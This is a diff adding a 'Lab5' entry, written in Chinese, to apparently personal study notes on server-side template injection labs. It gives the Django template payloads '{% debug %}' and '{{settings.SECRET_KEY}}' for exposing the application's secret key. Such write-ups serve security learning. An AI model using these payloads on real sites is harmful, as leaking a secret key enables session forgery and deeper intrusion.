@@ -183,6 +183,21 @@ result:
 
 最後把指令換成刪除就可以完成 lab 了
 
+
+### Lab5
+透過報錯訊息可以知道框架式 django，閱讀 document 後發現有 debug tag
+
+payload
+```
+ {% debug %}
+```
+
+透過 debug 模式，我們可以看到我們可以 access `settings`，進一步去看[設定文件](https://github.com/django/django/blob/main/django/conf/global_settings.py)，可以知道我們想要的東西的變數名稱為 `SECRET_KEY`
+
+```
+{{settings.SECRET_KEY}}
+```
+
 ### picoCTF SSTI1
 payload
 ```twig
